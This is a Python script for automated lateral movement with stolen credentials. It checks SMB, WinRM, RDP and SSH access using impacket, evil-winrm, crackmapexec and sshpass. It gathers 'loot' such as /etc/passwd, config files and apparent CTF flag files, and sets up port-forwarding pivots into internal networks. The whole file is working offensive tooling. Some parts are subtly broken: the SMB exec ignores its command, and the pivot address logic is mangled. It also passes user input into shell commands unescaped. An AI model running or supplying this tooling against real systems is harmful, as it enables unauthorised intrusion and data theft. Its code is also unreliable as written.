```python
#!/usr/bin/env python3
"""
lateral_movement.py - Move laterally with credentials
Usage: python3 lateral_movement.py -t 10.10.10.5 -u user -p pass
"""

import argparse
import subprocess

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[1m'
X = '\033[0m'

class LateralMover:
    def __init__(self, target, username, password, domain=""):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        
    def smb_exec(self, command):
        cmd = f"impacket-psexec {self.domain}/{self.username}:{self.password}@{self.target}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def winrm_exec(self, command):
        cmd = f"evil-winrm -i {self.target} -u {self.username} -p '{self.password}' -c '{command}'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def wmi_exec(self, command):
        cmd = f"impacket-wmiexec {self.domain}/{self.username}:{self.password}@{self.target} '{command}'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def rdp_exec(self, command):
        cmd = f"xfreerdp /v:{self.target} /u:{self.username} /p:'{self.password}' /cert:ignore /app:'cmd.exe' /app-cmd:'{command}'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def ssh_exec(self, command):
        cmd = f"sshpass -p '{self.password}' ssh -o StrictHostKeyChecking=no {self.username}@{self.target} '{command}'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout
    
    def check_smb_access(self):
        print(f"{C}[*] Checking SMB access...{X}")
        cmd = f"crackmapexec smb {self.target} -u {self.username} -p '{self.password}'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if "Pwn3d!" in result.stdout:
            print(f"{G}[+] ADMIN access on SMB!{X}")
            return "admin"
        elif "(Guest)" in result.stdout or "USER" in result.stdout:
            print(f"{Y}[*] User access on SMB{X}")
            return "user"
        else:
            print(f"{R}[-] No SMB access{X}")
            return None
    
    def check_winrm_access(self):
        print(f"{C}[*] Checking WinRM access...{X}")
        cmd = f"crackmapexec winrm {self.target} -u {self.username} -p '{self.password}'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if "Pwn3d!" in result.stdout:
            print(f"{G}[+] ADMIN access on WinRM!{X}")
            return "admin"
        else:
            print(f"{R}[-] No WinRM access{X}")
            return None
    
    def check_rdp_access(self):
        print(f"{C}[*] Checking RDP access...{X}")
        cmd = f"xfreerdp /v:{self.target} /u:{self.username} /p:'{self.password}' /cert:ignore +auth-only 2>&1"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if "Authentication only" in result.stdout:
            print(f"{G}[+] RDP access available!{X}")
            return True
        else:
            print(f"{R}[-] No RDP access{X}")
            return None
    
    def check_ssh_access(self):
        print(f"{C}[*] Checking SSH access...{X}")
        cmd = f"sshpass -p '{self.password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {self.username}@{self.target} 'exit' 2>/dev/null"
        result = subprocess.run(cmd, shell=True)
        
        if result.returncode == 0:
            print(f"{G}[+] SSH access available!{X}")
            return True
        else:
            print(f"{R}[-] No SSH access{X}")
            return None
    
    def gather_loot(self):
        print(f"\n{B}{C}=== Gathering Loot ==={X}")
        
        commands = {
            "users": "net users" if self.domain else "cat /etc/passwd",
            "system": "systeminfo" if self.domain else "uname -a",
            "network": "ipconfig /all" if self.domain else "ifconfig -a",
            "processes": "tasklist" if self.domain else "ps aux",
            "configs": "dir /s *.config" if self.domain else "find / -name '*.conf' 2>/dev/null",
            "flags": "dir /s *flag*.txt" if self.domain else "find / -name 'flag.txt' -o -name 'proof.txt' -o -name 'root.txt' -o -name 'user.txt' 2>/dev/null"
        }
        
        for name, command in commands.items():
            print(f"\n{C}[*] Gathering {name}...{X}")
            
            if self.check_winrm_access():
                result = self.winrm_exec(command)
                print(result[:500])
            elif self.check_smb_access():
                result = self.smb_exec(command)
                print(result[:500])
            elif self.check_ssh_access():
                result = self.ssh_exec(command)
                print(result[:500])
    
    def pivot(self, internal_network):
        print(f"\n{B}{C}=== Attempting Pivot to {internal_network} ==={X}")
        
        check_cmd = "ipconfig" if self.domain else "ip a"
        interfaces = self.winrm_exec(check_cmd) if self.check_winrm_access() else self.ssh_exec(check_cmd)
        
        if internal_network in interfaces:
            print(f"{G}[+] Target is connected to {internal_network}!{X}")
            
            print(f"{Y}[!] Setting up port forwarding...{X}")
            if self.domain:
                self.winrm_exec(f"netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=445 connectaddress={internal_network.split('.')[0]}.1")
                print(f"{G}[+] Port forward set: {self.target}:8888 -> {internal_network}.1:445{X}")
            else:
                self.ssh_exec(f"ssh -L 8888:{internal_network.split('.')[0]}.1:445 localhost -f -N")
                print(f"{G}[+] SSH tunnel established{X}")
        else:
            print(f"{R}[-] Target not connected to {internal_network}{X}")

def main():
    ap = argparse.ArgumentParser(description="Lateral Movement Automation")
    ap.add_argument("-t", "--target", required=True)
    ap.add_argument("-u", "--username", required=True)
    ap.add_argument("-p", "--password", required=True)
    ap.add_argument("-d", "--domain", default="")
    ap.add_argument("--gather", action="store_true", help="Gather loot")
    ap.add_argument("--pivot", help="Internal network to pivot to (e.g., 192.168.1.0/24)")
    args = ap.parse_args()
    
    mover = LateralMover(args.target, args.username, args.password, args.domain)
    
    if args.gather:
        mover.gather_loot()
    
    if args.pivot:
        mover.pivot(args.pivot)
    
    if not args.gather and not args.pivot:
        print(f"\n{B}{C}=== Access Check for {args.target} ==={X}\n")
        mover.check_smb_access()
        mover.check_winrm_access()
        mover.check_rdp_access()
        mover.check_ssh_access()

if __name__ == "__main__":
    main()
```